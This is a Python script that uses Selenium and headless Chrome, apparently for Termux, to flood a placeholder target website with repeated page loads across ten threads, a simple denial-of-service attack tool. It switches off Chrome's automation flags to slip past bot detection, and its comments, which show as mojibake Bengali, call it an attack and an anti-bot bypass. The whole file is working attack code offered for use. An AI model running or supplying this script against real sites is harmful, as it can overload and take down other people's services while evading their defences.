from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import threading
import time

# ‚úÖ Chrome ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞ ‡¶∏‡ßá‡¶ü‡¶Ü‡¶™ (Anti-Bot Bypass)
chrome_options = Options()
chrome_options.add_argument("--headless")  # ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶ó‡ßç‡¶∞‡¶æ‡¶â‡¶®‡ßç‡¶° ‡¶Æ‡ßã‡¶°
chrome_options.add_argument("--disable-blink-features=AutomationControlled")
chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
chrome_options.add_experimental_option("useAutomationExtension", False)

# ‚úÖ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶ï ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
def attack(url, total_requests):
    service = Service("/data/data/com.termux/files/usr/bin/chromedriver")  # Termux ‡¶è‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶™‡¶æ‡¶•
    driver = webdriver.Chrome(service=service, options=chrome_options)

    for _ in range(total_requests):
        try:
            driver.get(url)
            print(f"üî• {url} ‡¶è ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶ï ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡ßü‡ßá‡¶õ‡ßá")
            time.sleep(0.5)
        except Exception as e:
            print(f"‚ùå ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶•: {e}")
    
    driver.quit()  # ‡¶•‡ßç‡¶∞‡ßá‡¶° ‡¶∂‡ßá‡¶∑ ‡¶π‡¶≤‡ßá ‡¶°‡ßç‡¶∞‡¶æ‡¶á‡¶≠‡¶æ‡¶∞ ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡¶æ

# ‚úÖ ‡¶Æ‡¶æ‡¶≤‡ßç‡¶ü‡¶ø-‡¶•‡ßç‡¶∞‡ßá‡¶°‡ßá‡¶° ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶ï ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
def start_attack(url, total_requests, threads):
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(url, total_requests // threads))
        thread_list.append(thread)
        thread.start()
    
    for thread in thread_list:
        thread.join()

# ‚úÖ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶ï ‡¶ö‡¶æ‡¶≤‡¶æ‡¶®‡ßã
if __name__ == "__main__":
    target_url = "https://target-website.com"  # ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ü‡¶æ‡¶∞‡ßç‡¶ó‡ßá‡¶ü URL ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶¶‡¶ø‡¶®
    total_requests = 10000  # ‡¶Æ‡ßã‡¶ü ‡¶∞‡¶ø‡¶ï‡ßã‡ßü‡ßá‡¶∏‡ßç‡¶ü ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ
    threads = 10  # ‡¶•‡ßç‡¶∞‡ßá‡¶°‡ßá‡¶∞ ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ (‡¶™‡¶æ‡¶∞‡¶æ‡¶≤‡¶æ‡¶≤ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶ï)
    
    start_attack(target_url, total_requests, threads)
